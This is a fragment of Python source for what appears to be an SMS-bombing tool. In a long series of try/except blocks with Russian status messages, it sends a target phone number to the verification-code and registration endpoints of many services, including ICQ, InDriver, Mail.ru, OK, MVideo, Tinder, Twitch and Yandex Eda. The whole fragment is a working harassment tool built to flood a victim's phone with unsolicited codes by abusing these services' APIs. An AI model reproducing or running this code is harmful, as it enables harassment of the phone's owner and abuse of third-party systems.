try:
    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    print('[+] ICQ отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
    print('[+] InDriver отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
    print('[+] Invitro отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
    print('[+] Pmsm отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
    print('[+] IVI отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
    print('[+] Lenta отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
    print('[+] Mail.ru отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
    print('[+] MVideo отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
    print('[+] OK отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://plink.tech/register/',json={"phone": _phone})
    print('[+] Plink отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
    print('[+] qlean отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
    print('[+] SMSgorod отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
    print('[+] Tinder отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
    print('[+] Twitch отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
    print('[+] CabWiFi отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
    print('[+] wowworks отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
    print('[+] Eda.Yandex отправлено!')
  except:
    print('[-] Не отправлено!')

  try:
    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    print('[+] Youla отправлено!')
  except:
    print('[-] Не отправлено!')
